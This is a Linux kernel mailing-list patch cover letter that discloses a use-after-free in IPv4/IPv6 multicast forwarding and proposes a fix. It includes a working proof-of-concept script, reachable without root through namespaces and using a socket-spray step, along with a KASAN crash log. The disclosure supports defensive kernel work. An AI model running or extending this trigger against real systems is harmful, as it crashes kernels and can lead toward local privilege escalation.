Received: from mail-pj1-f54.google.com (mail-pj1-f54.google.com [209.85.216.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9757C390CB5
	for <bpf@vger.kernel.org>; Wed, 12 Aug 2026 16:36:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.54
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786552615; cv=none; b=Mio5gUA55UcpXA+PGDRL0iDqJVfu9rLeWvjn5MXatrkjdPojp3WgwMc/nesg9JxzTyd24BsDmhkqNkSitVN0Sc6FDrmeMDEERU/VtHrywukSveQ1hLTeRHIo0iNB3a2JQwrxbbQN35tt9xnJw8NxdWQA/vX4vnHKyH2Ph4yzCF8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786552615; c=relaxed/simple;
	bh=Z48k2K9UjjrRAKYSu1rWzLj5QV4/bZ7zcXkVtvULBjg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=pGHzCQa6/93DiEk08Mf7PWX7m1Va0alaYzV/qiIdMSPrFzCU+YP8B5EtKn25ymOlKXvypsfPiU19rLrwKlKKuog9NZCwkk8b8cbBk1DsHWXArE8weLr8B2FQJv3roCQ9M4e4Om+YJvcFuPf8luSW39h9oXG6kLts3OdqDpB4YOM=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=mvn0S9YZ; arc=none smtp.client-ip=209.85.216.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="mvn0S9YZ"
Received: by mail-pj1-f54.google.com with SMTP id 98e67ed59e1d1-38dc4553f62so1555970a91.0
        for <bpf@vger.kernel.org>; Wed, 12 Aug 2026 09:36:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786552613; x=1787157413; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=X+16InD6vPYLXlNzYfyqhbuNhUth2eUgQY7oPpVEdBs=;
        b=mvn0S9YZnL8i/WJLTnIHQm2n8v0kFe1ZE4SSmgzLFegirG3eoLXHu6dfv4TXOZlFq5
         gViE4BILjhHbTbcbwjyIEKsvvcTuM1AQr7OhsOJqJNhPyuDM6a8pR6omQ6dLSwieIpAy
         z6yfk6X1w6xZhqEMfjWHdLCdnl1cU7qmkBpwFazGbn0LttYekwsjqBnXwhvYs4xpORrI
         LYIwUy8uszIOAVOhvDkzyUxnip96bBBPg7PkVYPUDsVgCGYaBn7sUAoC+7mNpNqmMLbo
         pyUN+TsL79vYH/vS4t1k5DpERNeMb7yQO5+Lg/7yo9+AQrX0xcT3MrlhCEx9paz65CBD
         AlLA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786552613; x=1787157413;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=X+16InD6vPYLXlNzYfyqhbuNhUth2eUgQY7oPpVEdBs=;
        b=nbZVkRlWbVApoL8zZtsQUBIoXaRO1F3g+4c8tGTiaGRPDNwZflBLSOeJlKpdsDCk5H
         LhUwbOth/8Rhu53X+87rLnjtfMZ/yNnCe17XRCDvKNLvDEDLQbb16qWWFDt30BAqx0f0
         bqKvKMAbJkgFKBMnMkOOkzViET4IdeAK32YCIXxV/SwDB77V7IJbFaAPaBJIYnoIr4Ns
         //QKb/wUVB/CShck8N/IOu8hSn8nC11I/HM+7iib2w4LNRSqXrhIBmz0CqkiL+JVPhwh
         cT0h7iPfgW/lQg5T33MO7uO5fRTfasiI/jt5To4kPCz78fXB0mFwNRuP0lzsBlpypXD8
         0GDA==
X-Forwarded-Encrypted: i=1; AHgh+RpEWOGs5cG1rUIrSSRWbPejt2sb4iKjk6diSLXFzI1jknvkKjO+uQkIT0mna3WCE5Jqchk=@vger.kernel.org
X-Gm-Message-State: AOJu0YzX/8tijcRuGnbdfV/xSLWZCknwY/Qo1oqxWwjHANMXqFgh45wu
	Jmvy5DqrL5CY0fCnydkYRPDoMwQmY8DrSmFsaQii4BeM9UJYwWQL62bErfyTJ1pwcl6+
X-Gm-Gg: AR+sD1397hdxqma4N95wwX7ae+cdewbFc/76G8Sq2GNaSegEvn3ZYS5ueaR/t4cqon8
	lrpNll//W0Wc06+dXe8GCC1semdiY2tWeW9z2+yT0lr/3NckkMd5IMsIDZMe50mGYUjAyXwFA+Q
	JaCrq1lGPbFYYXagu1qx2TmB4B/bF7hMVGAyHbaDi6s7+rK3YxZFTL1sQcgQ8rGtgdewKE56hrM
	aQhrWkG7+ePTiBInc7Q/oRvgsWHiQgYC0eTIwEvSvgjRvapQoXsQyE9CStmdQmZ/SE5jyz5EXUp
	LVNCt5sUlvsshmr6tZ3lwDclhVVbps2nQB5pvjkPSHCvFKaOGtsGJaG2a1nWzBtubzFEcf1Ukcx
	VKo1CIFPKGxwmT6LmKoAsN4d1f9Pt6HLZfy9z9GBYA93vaHp3Y+DJIW2r65yP392hEJifoaPTFO
	02kFAU3H1pY/K/INsLF/nStWkrlWuaPOAdkDB1VAiHFEc6AvK9yDBscvZ0fdmWQLtO+4bzPVZ1i
	qY+
X-Received: by 2002:a17:90a:d2c8:b0:38e:57a3:f218 with SMTP id 98e67ed59e1d1-39301529037mr7285765a91.13.1786552612514;
        Wed, 12 Aug 2026 09:36:52 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3931cd46314sm47499a91.6.2026.08.12.09.36.46
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 12 Aug 2026 09:36:51 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: idosch@nvidia.com,
	netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	ast@kernel.org,
	kafai@fb.com,
	joe@wand.net.nz,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v3 0/1] ip: orphan prefetched skbs before multicast forwarding
Date: Thu, 13 Aug 2026 00:36:37 +0800
Message-ID: <cover.1786552223.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv4/ipmr.c and net/ipv6/ip6_input.c.
The bug is reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

IPv4 and IPv6 input can preserve an skb->sk association installed by
bpf_sk_assign() or UDP early demux without holding a reference on the
selected socket. Local delivery consumes that association while the
receive-side RCU read-side critical section still protects the socket.

When a multicast packet is not locally deliverable, the IPv4 and IPv6
multicast routing paths can instead retain the original skb. The skb may be
queued on an unresolved multicast route or forwarded after the receive-side
RCU section ends. Userspace can then destroy the prefetched socket before the
skb is released, leaving skb->sk stale. A later free invokes sock_pfree() and
dereferences the freed socket.

Orphan the original skb before each non-local multicast forwarding path.
Local delivery remains unchanged, and the existing skb_clone() paths already
give multicast forwarding a clone without the socket association.

Reproducer:

    chmod +x ~/poc.sh
    unshare -Urn -- bash -lc ~/poc.sh

We run the PoC in an x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

GROUP_ADDR="${GROUP_ADDR:-ff0e::123}"
SRC_ADDR="${SRC_ADDR:-2001:db8:1::2}"
DST_ADDR="${DST_ADDR:-2001:db8:1::1}"
SPORT="${SPORT:-31337}"
DPORT="${DPORT:-42424}"
IF_RX="${IF_RX:-v0}"
IF_TX="${IF_TX:-v1}"
COUNT="${COUNT:-1}"

cleanup() {
	ip link del "$IF_RX" 2>/dev/null || true
}
trap cleanup EXIT

ip link del "$IF_RX" 2>/dev/null || true
ip link add "$IF_RX" type veth peer name "$IF_TX"
ip link set lo up
ip link set "$IF_RX" up
ip link set "$IF_TX" up
ip -6 addr add "${DST_ADDR}/64" dev "$IF_RX" nodad
ip -6 addr add "${SRC_ADDR}/64" dev "$IF_TX" nodad

export GROUP_ADDR SRC_ADDR DST_ADDR SPORT DPORT IF_RX IF_TX COUNT

python3 - <<'PY'
import fcntl
import ipaddress
import os
import socket
import struct
import sys
import time

SIOCGIFHWADDR = 0x8927
SOL_IPV6 = socket.IPPROTO_IPV6
MRT6_INIT = 200
MRT6_ADD_MIF = 202

GROUP = os.environ["GROUP_ADDR"]
SRC_ADDR = os.environ["SRC_ADDR"]
DST_ADDR = os.environ["DST_ADDR"]
SPORT = int(os.environ["SPORT"])
DPORT = int(os.environ["DPORT"])
IF_RX = os.environ["IF_RX"]
IF_TX = os.environ["IF_TX"]
COUNT = int(os.environ["COUNT"])


def get_hwaddr(ifname: str) -> bytes:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack("256s", ifname.encode())
        res = fcntl.ioctl(s.fileno(), SIOCGIFHWADDR, ifreq)
        return res[18:24]
    finally:
        s.close()


def csum(data: bytes) -> int:
    if len(data) & 1:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


def udp6_checksum(src: bytes, dst: bytes, udp: bytes, payload: bytes) -> int:
    pseudo = src + dst + struct.pack("!I3xB", len(udp) + len(payload), socket.IPPROTO_UDP)
    return csum(pseudo + udp + payload)


rx_mac = get_hwaddr(IF_RX)
tx_mac = get_hwaddr(IF_TX)
tx_ifindex = socket.if_nametoindex(IF_TX)
rx_ifindex = socket.if_nametoindex(IF_RX)
src_ip = ipaddress.IPv6Address(SRC_ADDR).packed
group_ip = ipaddress.IPv6Address(GROUP).packed

print(f"[+] {IF_RX} ifindex={rx_ifindex} mac={rx_mac.hex(':')}")
print(f"[+] {IF_TX} ifindex={tx_ifindex} mac={tx_mac.hex(':')}")

mroute = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
mroute.settimeout(1.0)
mroute.setsockopt(SOL_IPV6, MRT6_INIT, struct.pack("@I", 1))
mif = struct.pack("@HBBHI", 0, 0, 1, rx_ifindex, 0)
mroute.setsockopt(SOL_IPV6, MRT6_ADD_MIF, mif)
print("[+] Enabled IPv6 multicast routing and added ingress MIF")

udp = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
udp.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, IF_RX.encode() + b"\x00")
udp.bind((GROUP, DPORT, 0, 0))
udp.connect((SRC_ADDR, SPORT, 0, 0))
print("[+] Bound UDP socket to multicast group and connected it to the sender")

payload = b"UAF!"
udp_len = 8 + len(payload)
udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, 0)
udp_sum = udp6_checksum(src_ip, group_ip, udp_hdr, payload)
udp_hdr = struct.pack("!HHHH", SPORT, DPORT, udp_len, udp_sum)
ipv6_hdr = struct.pack("!IHBB16s16s", (6 << 28), udp_len, socket.IPPROTO_UDP, 64, src_ip, group_ip)
eth_hdr = rx_mac + tx_mac + struct.pack("!H", 0x86DD)
frame = eth_hdr + ipv6_hdr + udp_hdr + payload

pkt = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x86DD))
pkt.bind((IF_TX, 0))

for i in range(COUNT):
    pkt.send(frame)
    print(f"[+] Sent crafted frame {i + 1}/{COUNT}")
    time.sleep(0.05)

try:
    report = mroute.recv(4096)
    print(f"[+] Received multicast-routing report ({len(report)} bytes)")
except TimeoutError:
    print("[-] Did not receive multicast-routing report before timeout", file=sys.stderr)

udp.close()
print("[+] Closed matched UDP socket; forcing a short grace-period window before mroute cleanup")
for _ in range(16):
    spray = []
    for _ in range(64):
        spray.append(socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0))
    for s in spray:
        s.close()
time.sleep(1)
print("[+] Closing the mroute socket to flush the unresolved queue")
mroute.close()
time.sleep(1)
print("[-] No crash observed after mroute cleanup")
PY

------END poc.sh--------

----BEGIN crash log----

[  233.980031][T10483] page_owner tracks the page as allocated
[  233.980997][T10483] page last allocated via order 3, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10250, tgid 10250 (sshd-auth), ts 133770429918, free_ts 133706329619
[  233.984140][T10483] page last free pid 10250 tgid 10250 stack trace:
[  233.985380][T10483] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  233.986371][T10483] CPU: 1 UID: 1028 PID: 10483 Comm: python3 Not tainted 6.12.95 #2
[  233.987459][T10483] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  233.989090][T10483] Call Trace:
[  233.989583][T10483]  <TASK>
[  233.989996][T10483]  panic (build/../kernel/panic.c:108)
[  233.990555][T10483]  ? __pfx_panic (build/../kernel/panic.c:740)
[  233.991198][T10483]  ? rcu_is_watching (build/../include/linux/context_tracking.h:128 (discriminator 1) build/../kernel/rcu/tree.c:752 (discriminator 1))
[  233.991902][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  233.992689][T10483]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
[  233.993399][T10483]  ? mark_held_locks (build/../kernel/locking/lockdep.c:4364 (discriminator 1))
[  233.994058][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
[  233.994697][T10483]  check_panic_on_warn (build/../kernel/panic.c:527 (discriminator 1))
[  233.995387][T10483]  end_report (build/../include/linux/srcu.h:634 build/../include/trace/events/error_report.h:69 build/../include/trace/events/error_report.h:69 build/../mm/kasan/report.c:222)
[  233.995994][T10483]  kasan_report (build/../mm/kasan/report.c:597)
[  233.996621][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
[  233.997277][T10483]  sock_pfree (build/../net/core/sock.c:3919)
[  233.997878][T10483]  skb_release_head_state (build/../net/core/skbuff.c:1164)
[  233.998614][T10483]  sk_skb_reason_drop (build/../include/linux/refcount.h:395 build/../include/linux/refcount.h:432 build/../include/linux/refcount.h:450 build/../include/linux/skbuff.h:1292 build/../net/core/skbuff.c:1212 build/../net/core/skbuff.c:1240)
[  233.999304][T10483]  ip6mr_destroy_unres (build/../net/ipv6/ip6mr.c:783 build/../net/ipv6/ip6mr.c:810)
[  234.000008][T10483]  mroute_clean_tables (build/../include/linux/instrumented.h:112 build/../include/asm-generic/bitops/instrumented-lock.h:57 build/../include/linux/bit_spinlock.h:40 build/../include/linux/rhashtable.h:328 build/../include/linux/rhashtable.h:1063 build/../include/linux/rhashtable.h:1144 build/../include/linux/rhashtable.h:1195 build/../net/ipv4/ipmr.c:1344)
[  234.000780][T10483]  ? __pfx_mroute_clean_tables (build/../net/ipv4/ipmr.c:3147)
[  234.001562][T10483]  ? do_raw_spin_lock (build/../arch/x86/include/asm/atomic.h:107 (discriminator 4) build/../include/linux/atomic/atomic-arch-fallback.h:2170 (discriminator 4) build/../include/linux/atomic/atomic-instrumented.h:1302 (discriminator 4) build/../include/asm-generic/qspinlock.h:111 (discriminator 4) build/../kernel/locking/spinlock_debug.c:116 (discriminator 4))
[  234.002275][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  234.003037][T10483]  ? nlmsg_notify (build/../include/net/netlink.h:1163 build/../include/net/netlink.h:1184 build/../net/netlink/af_netlink.c:2593)
[  234.003689][T10483]  ip6mr_sk_done (build/../net/ipv6/ip6mr.c:1627 (discriminator 7))
[  234.004359][T10483]  rawv6_close (build/../net/ipv6/raw.c:1163)
[  234.004949][T10483]  inet_release (build/../net/ipv4/af_inet.c:443)
[  234.005587][T10483]  __sock_release (build/../net/socket.c:722)
[  234.006239][T10483]  sock_close (build/../net/socket.c:1514 (discriminator 1))
[  234.006828][T10483]  __fput (build/../fs/file_table.c:505)
[  234.007408][T10483]  __x64_sys_close (build/../fs/open.c:1501 (discriminator 1) build/../fs/open.c:1492 (discriminator 1) build/../fs/open.c:1492 (discriminator 1))
[  234.008100][T10483]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
[  234.008743][T10483]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  234.009574][T10483] RIP: 0033:0x7f2cf3098687
[  234.010187][T10483] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[  234.013809][T10483] RSP: 002b:00007ffc31527620 EFLAGS: 00000202 ORIG_RAX: 0000000000000003
[  234.015292][T10483] RAX: ffffffffffffffda RBX: 00007f2cf3004780 RCX: 00007f2cf3098687
[  234.016667][T10483] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
[  234.018064][T10483] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
[  234.019365][T10483] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000a83590
[  234.020465][T10483] R13: 00007f2cf3340180 R14: 0000000000000000 R15: 00007f2cf3340188
[  234.021975][T10483]  </TASK>
[  234.022699][T10483] Kernel Offset: disabled
[  234.023317][T10483] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ip: orphan prefetched skbs before multicast forwarding

 net/ipv4/ipmr.c      | 3 +++
 net/ipv6/ip6_input.c | 1 +
 2 files changed, 4 insertions(+)

-- 
2.43.0

